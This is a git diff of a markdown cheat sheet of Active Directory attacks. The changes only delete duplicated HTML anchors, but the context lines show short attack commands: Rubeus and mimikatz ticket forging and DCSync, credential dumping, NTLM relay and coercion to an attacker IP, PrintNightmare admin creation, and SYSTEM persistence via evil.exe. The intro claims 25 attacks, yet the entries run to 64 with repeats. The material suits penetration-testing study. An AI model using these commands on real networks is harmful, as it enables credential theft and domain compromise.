@@ -89,8 +89,6 @@ This document provides a detailed walkthrough of **25 real-world Active Director
 
 <a name="as-rep-roasting"></a>
 <details>
-  <a name="as-rep-roasting"></a>
-<details>
   <summary><strong>1. AS-REP Roasting</strong></summary>
 
 - **Purpose**: Offline cracking of user password hash  
@@ -109,8 +107,6 @@ Rubeus.exe asreproast
 </details>
 
 <a name="kerberoasting"></a>
-<details>
-  <a name="kerberoasting"></a>
 <details>
   <summary><strong>2. Kerberoasting</strong></summary>
 
@@ -131,8 +127,6 @@ Rubeus.exe kerberoast
 
 <a name="pass-the-hash"></a>
 <details>
-  <a name="pass-the-hash-pth"></a>
-<details>
   <summary><strong>3. Pass-the-Hash (PtH)</strong></summary>
 
 - **Purpose**: Authenticate without knowing plaintext password  
@@ -151,8 +145,6 @@ evil-winrm -i 192.168.1.20 -u user -H <NTLM>
 </details>
 
 <a name="pass-the-ticket"></a>
-<details>
-  <a name="pass-the-ticket-ptt"></a>
 <details>
   <summary><strong>4. Pass-the-Ticket (PtT)</strong></summary>
 
@@ -176,8 +168,6 @@ kerberos::ptt ticket.kirbi
 
 <a name="overpass-the-hash"></a>
 <details>
-  <a name="overpass-the-hash-pass-the-key"></a>
-<details>
   <summary><strong>5. Overpass-the-Hash (Pass-the-Key)</strong></summary>
 
 - **Purpose**: Generate TGT using NTLM hash instead of password  
@@ -197,8 +187,6 @@ Rubeus.exe ptt /ticket:<base64>.kirbi
 
 <a name="golden-ticket"></a>
 <details>
-  <a name="golden-ticket"></a>
-<details>
   <summary><strong>6. Golden Ticket</strong></summary>
 
 - **Purpose**: Forge a TGT for any user with unlimited lifetime  
@@ -215,8 +203,6 @@ kerberos::ptt golden.kirbi
 </details>
 
 <a name="silver-ticket"></a>
-<details>
-  <a name="silver-ticket"></a>
 <details>
   <summary><strong>7. Silver Ticket</strong></summary>
 
@@ -235,8 +221,6 @@ kerberos::ptt silver.kirbi
 
 <a name="dcsync-attack"></a>
 <details>
-  <a name="dcsync-attack"></a>
-<details>
   <summary><strong>8. DCSync Attack</strong></summary>
 
 - **Purpose**: Extract password hashes directly from DC  
@@ -251,8 +235,6 @@ lsadump::dcsync /domain:domain.local /user:Administrator
 </details>
 
 <a name="dcshadow-attack"></a>
-<details>
-  <a name="dcshadow-attack"></a>
 <details>
   <summary><strong>9. DCShadow Attack</strong></summary>
 
@@ -270,8 +252,6 @@ lsadump::dcshadow /object:CN=user,CN=Users,DC=domain,DC=local /attribute:Descrip
 
 <a name="shadow-credentials"></a>
 <details>
-  <a name="shadow-credentials"></a>
-<details>
   <summary><strong>10. Shadow Credentials</strong></summary>
 
 - **Purpose**: Persist access using alternate credentials (KeyCredential)  
@@ -288,8 +268,6 @@ python3 pywhisker.py --action add --target 'user@domain.local' --sid S-1-5-... -
 
 
 <a name="unconstrained-delegation"></a>
-<details>
-  <a name="unconstrained-delegation"></a>
 <details>
   <summary><strong>11. Unconstrained Delegation</strong></summary>
 
@@ -310,8 +288,6 @@ Rubeus.exe dump
 
 <a name="constrained-delegation"></a>
 <details>
-  <a name="constrained-delegation"></a>
-<details>
   <summary><strong>12. Constrained Delegation</strong></summary>
 
 - **Purpose**: Impersonate a user to a specific service  
@@ -327,8 +303,6 @@ Rubeus.exe s4u /user:<user> /rc4:<NTLM> /impersonateuser:Administrator /msdsspn:
 </details>
 
 <a name="resource-based-constrained-delegation"></a>
-<details>
-  <a name="resource-based-constrained-delegation-rbcd"></a>
 <details>
   <summary><strong>13. Resource-Based Constrained Delegation (RBCD)</strong></summary>
 
@@ -349,8 +323,6 @@ Rubeus.exe s4u ...
 
 <a name="printer-bug-coercion"></a>
 <details>
-  <a name="printer-bug-spoolsample"></a>
-<details>
   <summary><strong>14. Printer Bug (SpoolSample)</strong></summary>
 
 - **Purpose**: Coerce authentication from remote machine  
@@ -366,8 +338,6 @@ SpoolSample.exe <victim-ip> <attacker-ip>
 </details>
 
 <a name="shadow-admins"></a>
-<details>
-  <a name="shadow-admins"></a>
 <details>
   <summary><strong>15. Shadow Admins</strong></summary>
 
@@ -385,8 +355,6 @@ Invoke-ACLScanner | ? { $_.IdentityReference -like "*admin*" }
 
 <a name="admin-sdholder-abuse"></a>
 <details>
-  <a name="adminsdholder-abuse"></a>
-<details>
   <summary><strong>16. AdminSDHolder Abuse</strong></summary>
 
 - **Purpose**: Persistent privilege escalation  
@@ -402,8 +370,6 @@ Add-ADPermission -Identity "CN=AdminSDHolder,CN=System,DC=domain,DC=local" -User
 </details>
 
 <a name="acl-based-privesc"></a>
-<details>
-  <a name="acl-based-privesc"></a>
 <details>
   <summary><strong>17. ACL-Based PrivEsc</strong></summary>
 
@@ -424,8 +390,6 @@ Add-ADGroupMember -Identity "Domain Admins" -Members attacker
 
 <a name="gmsa-abuse"></a>
 <details>
-  <a name="gmsa-abuse"></a>
-<details>
   <summary><strong>18. gMSA Abuse</strong></summary>
 
 - **Purpose**: Abuse Group Managed Service Account to gain lateral access  
@@ -442,8 +406,6 @@ lsadump::gmsa
 
 <a name="ldap-signing-downgrade"></a>
 <details>
-  <a name="ldap-signing-downgrade"></a>
-<details>
   <summary><strong>19. LDAP Signing Downgrade</strong></summary>
 
 - **Purpose**: Downgrade secure LDAP communication for interception  
@@ -459,8 +421,6 @@ ntlmrelayx.py -t ldap://dc.domain.local --escalate-user attacker
 </details>
 
 <a name="zerologon"></a>
-<details>
-  <a name="zerologon-cve-2020-1472"></a>
 <details>
   <summary><strong>20. Zerologon (CVE-2020-1472)</strong></summary>
 
@@ -481,8 +441,6 @@ python3 zerologon_exploit.py dc.domain.local
 
 <a name="dnsadmin-to-dc-compromise"></a>
 <details>
-  <a name="dnsadmin-to-dc-compromise"></a>
-<details>
   <summary><strong>21. DNSAdmin to DC Compromise</strong></summary>
 
 - **Purpose**: Elevate privileges to SYSTEM on a Domain Controller  
@@ -501,8 +459,6 @@ sc \<dc> start dns
 
 <a name="password-spray"></a>
 <details>
-  <a name="password-spray"></a>
-<details>
   <summary><strong>22. Password Spray</strong></summary>
 
 - **Purpose**: Identify weak passwords across many users  
@@ -518,8 +474,6 @@ crackmapexec smb <target> -u users.txt -p 'Password123'
 
 <a name="llmnr-nbt-ns-poisoning"></a>
 <details>
-  <a name="llmnrnbt-ns-poisoning"></a>
-<details>
   <summary><strong>23. LLMNR/NBT-NS Poisoning</strong></summary>
 
 - **Purpose**: Capture NetNTLMv2 hashes from network  
@@ -534,8 +488,6 @@ responder -I eth0
 </details>
 
 <a name="golden-ticket"></a>
-<details>
-  <a name="golden-ticket"></a>
 <details>
   <summary><strong>24. Golden Ticket</strong></summary>
 
@@ -554,8 +506,6 @@ kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21... /krbt
 
 <a name="silver-ticket"></a>
 <details>
-  <a name="silver-ticket"></a>
-<details>
   <summary><strong>25. Silver Ticket</strong></summary>
 
 - **Purpose**: Access services without contacting DC  
@@ -571,8 +521,6 @@ kerberos::ptt ticket.kirbi
 </details>
 
 <a name="privileged-session-hijack"></a>
-<details>
-  <a name="privileged-session-hijack"></a>
 <details>
   <summary><strong>26. Privileged Session Hijack</strong></summary>
 
@@ -591,8 +539,6 @@ token::elevate
 
 <a name="kerberos-unconstrained-delegation-ticket-theft"></a>
 <details>
-  <a name="kerberos-unconstrained-delegation-ticket-theft"></a>
-<details>
   <summary><strong>27. Kerberos Unconstrained Delegation Ticket Theft</strong></summary>
 
 - **Purpose**: Steal TGTs from systems with delegation enabled  
@@ -608,8 +554,6 @@ Rubeus.exe dump
 </details>
 
 <a name="kerberos-over-pass-the-ticket"></a>
-<details>
-  <a name="kerberos-over-pass-the-ticket-ptt"></a>
 <details>
   <summary><strong>28. Kerberos Over Pass-the-Ticket (PtT)</strong></summary>
 
@@ -627,8 +571,6 @@ kerberos::ptt ticket.kirbi
 
 <a name="kerberos-rc4-ticket-renewal"></a>
 <details>
-  <a name="kerberos-rc4-ticket-renewal"></a>
-<details>
   <summary><strong>29. Kerberos RC4 Ticket Renewal</strong></summary>
 
 - **Purpose**: Extend lifetime of Kerberos tickets  
@@ -644,8 +586,6 @@ Rubeus.exe renew /ticket:<kirbi>
 </details>
 
 <a name="delegation-chaining"></a>
-<details>
-  <a name="delegation-chaining"></a>
 <details>
   <summary><strong>30. Delegation Chaining</strong></summary>
 
@@ -664,8 +604,6 @@ Collect data → Analyze delegation edges
 
 <a name="kerberos-resource-based-constrained-delegation-rbcd"></a>
 <details>
-  <a name="resource-based-constrained-delegation-rbcd"></a>
-<details>
   <summary><strong>31. Resource-Based Constrained Delegation (RBCD)</strong></summary>
 
 - **Purpose**: Elevate privileges by controlling another computer’s delegation rights  
@@ -683,8 +621,6 @@ Set-ADComputer 'TARGET' -PrincipalsAllowedToDelegateToAccount 'owned$'
 
 <a name="shadow-credentials"></a>
 <details>
-  <a name="shadow-credentials"></a>
-<details>
   <summary><strong>32. Shadow Credentials</strong></summary>
 
 - **Purpose**: Persist access by planting alternate credentials  
@@ -700,8 +636,6 @@ pywhisker add -u targetuser -d domain -k c:\cert.pfx
 </details>
 
 <a name="acl-based-privilege-escalation"></a>
-<details>
-  <a name="acl-based-privilege-escalation"></a>
 <details>
   <summary><strong>33. ACL-Based Privilege Escalation</strong></summary>
 
@@ -719,8 +653,6 @@ Collect ACL data → Analyze Effective Permissions
 
 <a name="dcsync"></a>
 <details>
-  <a name="dcsync-attack"></a>
-<details>
   <summary><strong>34. DCSync Attack</strong></summary>
 
 - **Purpose**: Dump password hashes for any domain user  
@@ -737,8 +669,6 @@ lsadump::dcsync /domain:domain.local /user:krbtgt
 
 <a name="unquoted-service-path"></a>
 <details>
-  <a name="unquoted-service-path"></a>
-<details>
   <summary><strong>35. Unquoted Service Path</strong></summary>
 
 - **Purpose**: Exploit unquoted service path to execute malicious binary as SYSTEM  
@@ -754,8 +684,6 @@ wmic service get name,pathname,startmode | findstr /i "Auto"
 </details>
 
 <a name="alwaysinstall-elevated-misconfiguration"></a>
-<details>
-  <a name="alwaysinstallelevated-misconfiguration"></a>
 <details>
   <summary><strong>36. AlwaysInstallElevated Misconfiguration</strong></summary>
 
@@ -775,8 +703,6 @@ msiexec /quiet /qn /i evil.msi
 
 <a name="service-permissions-abuse"></a>
 <details>
-  <a name="service-permissions-abuse"></a>
-<details>
   <summary><strong>37. Service Permissions Abuse</strong></summary>
 
 - **Purpose**: Modify service config to execute code as SYSTEM  
@@ -792,8 +718,6 @@ sc config <service> binpath= "cmd.exe /c calc.exe"
 </details>
 
 <a name="wmi-event-subscription-persistence"></a>
-<details>
-  <a name="wmi-event-subscription-persistence"></a>
 <details>
   <summary><strong>38. WMI Event Subscription Persistence</strong></summary>
 
@@ -811,8 +735,6 @@ $Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter ...
 
 <a name="admin-sdholder-abuse"></a>
 <details>
-  <a name="adminsdholder-abuse"></a>
-<details>
   <summary><strong>39. AdminSDHolder Abuse</strong></summary>
 
 - **Purpose**: Persist elevated privileges via protected groups template  
@@ -827,8 +749,6 @@ Set-ADACL -Target "CN=AdminSDHolder,CN=System,DC=domain,DC=local" ...
 </details>
 
 <a name="domain-controller-sync-via-rbcd"></a>
-<details>
-  <a name="domain-controller-sync-via-rbcd"></a>
 <details>
   <summary><strong>40. Domain Controller Sync via RBCD</strong></summary>
 
@@ -848,8 +768,6 @@ Set-RBCD on DC → Use Rubeus DCSync
 
 <a name="netlogon-zero-logon-cve-2020-1472"></a>
 <details>
-  <a name="netlogon-zerologon-cve-2020-1472"></a>
-<details>
   <summary><strong>41. Netlogon ZeroLogon (CVE-2020-1472)</strong></summary>
 
 - **Purpose**: Gain domain admin access by exploiting Netlogon protocol flaw  
@@ -864,8 +782,6 @@ python3 zerologon_tester.py dc-name dc-ip
 </details>
 
 <a name="ntlm-relay"></a>
-<details>
-  <a name="ntlm-relay"></a>
 <details>
   <summary><strong>42. NTLM Relay</strong></summary>
 
@@ -883,8 +799,6 @@ ntlmrelayx.py -t ldap://target --escalate-user vulnerable
 
 <a name="printnightmare-cve-2021-34527"></a>
 <details>
-  <a name="printnightmare-cve-2021-34527"></a>
-<details>
   <summary><strong>43. PrintNightmare (CVE-2021-34527)</strong></summary>
 
 - **Purpose**: Remote code execution via Print Spooler service  
@@ -899,8 +813,6 @@ Invoke-Nightmare -NewUser "pwned" -AddToAdministrators
 </details>
 
 <a name="samaccountname-spoofing-cve-2021-42278"></a>
-<details>
-  <a name="samaccountname-spoofing-cve-2021-42278"></a>
 <details>
   <summary><strong>44. SAMAccountName Spoofing (CVE-2021-42278)</strong></summary>
 
@@ -918,8 +830,6 @@ Rubeus asktgt /user:DC01 /rc4:<hash>
 
 <a name="petitpotam-adcs-relay"></a>
 <details>
-  <a name="petitpotam--adcs-relay"></a>
-<details>
   <summary><strong>45. PetitPotam + ADCS Relay</strong></summary>
 
 - **Purpose**: Coerce machine to authenticate to attacker and relay to ADCS  
@@ -935,8 +845,6 @@ ntlmrelayx.py -t http://CA-server/certsrv/ --adcs
 </details>
 
 <a name="delegation-abuse-unconstrained"></a>
-<details>
-  <a name="delegation-abuse---unconstrained"></a>
 <details>
   <summary><strong>46. Delegation Abuse - Unconstrained</strong></summary>
 
@@ -954,8 +862,6 @@ Rubeus tgtdeleg
 
 <a name="kerberos-rc4-hashing-deprecated-vuln"></a>
 <details>
-  <a name="kerberos-rc4-hashing-weak-crypto"></a>
-<details>
   <summary><strong>47. Kerberos RC4 Hashing (Weak Crypto)</strong></summary>
 
 - **Purpose**: Exploit weak encryption for ticket forging  
@@ -970,8 +876,6 @@ Rubeus asktgt /user:target /rc4:<ntlm> /ptt
 </details>
 
 <a name="kerberos-golden-ticket"></a>
-<details>
-  <a name="golden-ticket"></a>
 <details>
   <summary><strong>48. Golden Ticket</strong></summary>
 
@@ -988,8 +892,6 @@ mimikatz "kerberos::ptt golden.kirbi"
 
 <a name="ldap-signing-bypass"></a>
 <details>
-  <a name="ldap-signing-not-enforced"></a>
-<details>
   <summary><strong>49. LDAP Signing Not Enforced</strong></summary>
 
 - **Purpose**: Relay NTLM to LDAP without signing  
@@ -1004,8 +906,6 @@ ntlmrelayx.py -t ldap://dc-ip --escalate-user victim
 </details>
 
 <a name="overpass-the-hash-pass-the-key"></a>
-<details>
-  <a name="overpass-the-hash-pass-the-key"></a>
 <details>
   <summary><strong>50. OverPass-the-Hash (Pass-the-Key)</strong></summary>
 
@@ -1023,8 +923,6 @@ mimikatz "kerberos::ptt /user:user /domain:lab.local /rc4:<ntlm>"
 
 <a name="resource-based-constrained-delegation"></a>
 <details>
-  <a name="resource-based-constrained-delegation-rbcd"></a>
-<details>
   <summary><strong>51. Resource-Based Constrained Delegation (RBCD)</strong></summary>
 
 - **Purpose**: Allow impersonation on target by modifying msDS-AllowedToActOnBehalfOfOtherIdentity  
@@ -1040,8 +938,6 @@ Set-ADComputer 'victim$' -PrincipalsAllowedToDelegateToAccount 'pwned$'
 </details>
 
 <a name="unquoted-service-path"></a>
-<details>
-  <a name="unquoted-service-path"></a>
 <details>
   <summary><strong>52. Unquoted Service Path</strong></summary>
 
@@ -1059,8 +955,6 @@ sc qc vulnservice
 
 <a name="weak-service-permissions"></a>
 <details>
-  <a name="weak-service-permissions"></a>
-<details>
   <summary><strong>53. Weak Service Permissions</strong></summary>
 
 - **Purpose**: Modify service binary to execute attacker code  
@@ -1076,8 +970,6 @@ sc config vulnservice binpath= "C:\evil.exe"
 </details>
 
 <a name="mimikatz-sekurlsa-dump"></a>
-<details>
-  <a name="credential-dumping-with-mimikatz"></a>
 <details>
   <summary><strong>54. Credential Dumping with Mimikatz</strong></summary>
 
@@ -1096,8 +988,6 @@ sekurlsa::logonpasswords
 
 <a name="browser-creds-and-lsass"></a>
 <details>
-  <a name="dumping-browser-creds--lsass-offline"></a>
-<details>
   <summary><strong>55. Dumping Browser Creds & LSASS Offline</strong></summary>
 
 - **Purpose**: Steal saved browser passwords or LSASS dump for offline parsing  
@@ -1114,8 +1004,6 @@ mimikatz "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords"
 
 <a name="wmi-persistence"></a>
 <details>
-  <a name="wmi-event-subscription-persistence"></a>
-<details>
   <summary><strong>56. WMI Event Subscription Persistence</strong></summary>
 
 - **Purpose**: Maintain access using permanent WMI events  
@@ -1130,8 +1018,6 @@ Invoke-WmiEvent -Trigger Win32ProcessStartTrace -Command "calc.exe"
 </details>
 
 <a name="scheduled-task-persistence"></a>
-<details>
-  <a name="scheduled-task-persistence"></a>
 <details>
   <summary><strong>57. Scheduled Task Persistence</strong></summary>
 
@@ -1148,8 +1034,6 @@ schtasks /create /tn "Updater" /tr "C:\evil.exe" /sc onlogon /ru System
 
 <a name="user-account-control-bypass"></a>
 <details>
-  <a name="uac-bypass"></a>
-<details>
   <summary><strong>58. UAC Bypass</strong></summary>
 
 - **Purpose**: Elevate from medium integrity to high integrity without prompt  
@@ -1165,8 +1049,6 @@ Invoke-BinaryUACBypass -Method fodhelper -Command "C:\evil.exe"
 
 <a name="shadow-credentials"></a>
 <details>
-  <a name="shadow-credentials"></a>
-<details>
   <summary><strong>59. Shadow Credentials</strong></summary>
 
 - **Purpose**: Persist access via alternate credentials (KeyCredential)  
@@ -1181,8 +1063,6 @@ certify shadow /user:target /dc:dc-ip /machine:attacker
 </details>
 
 <a name="adcs-template-misconfig"></a>
-<details>
-  <a name="adcs-certificate-template-misconfig"></a>
 <details>
   <summary><strong>60. ADCS Certificate Template Misconfig</strong></summary>
 
@@ -1200,8 +1080,6 @@ certify request /template:User /altname:admin
 
 <a name="printerbug-coercion"></a>
 <details>
-  <a name="printerbug-coercion"></a>
-<details>
   <summary><strong>61. PrinterBug Coercion</strong></summary>
 
 - **Purpose**: Coerce machine to authenticate to attacker  
@@ -1218,8 +1096,6 @@ printerbug.py attacker@domain target
 
 <a name="priv-esc-across-trust-key-abuse"></a>
 <details>
-  <a name="privesc-across-external-trust-trust-key-abuse"></a>
-<details>
   <summary><strong>62. PrivEsc across External Trust – Trust Key Abuse</strong></summary>
 
 - **Purpose**: Exploit trust misconfig to access another domain  
@@ -1235,8 +1111,6 @@ Rubeus tgtdeleg /rc4:<trustkey> /domain:child.domain
 
 <a name="kerberos-key-listing-dumping"></a>
 <details>
-  <a name="kerberos-key-listingdumping"></a>
-<details>
   <summary><strong>63. Kerberos Key Listing/Dumping</strong></summary>
 
 - **Purpose**: Extract Kerberos keys from memory or dump  
@@ -1251,8 +1125,6 @@ mimikatz "sekurlsa::ekeys"
 </details>
 
 <a name="kerberos-renewable-ticket-abuse"></a>
-<details>
-  <a name="renewable-kerberos-ticket-abuse"></a>
 <details>
   <summary><strong>64. Renewable Kerberos Ticket Abuse</strong></summary>
 
